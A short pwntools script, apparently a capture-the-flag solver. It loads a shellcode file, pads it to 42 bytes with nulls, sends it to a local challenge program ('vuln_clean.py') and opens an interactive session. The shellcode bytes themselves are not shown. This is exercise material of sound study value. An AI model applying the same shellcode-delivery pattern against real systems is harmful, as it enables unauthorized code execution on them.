from pwn import *

p = process(["python", "challenge/vuln_clean.py"])

with open("shellcode/basic/version3", "rb") as f:
    data = f.read()
    data = data+b"\x00"*(42-len(data))
    p.send(data)

p.interactive()
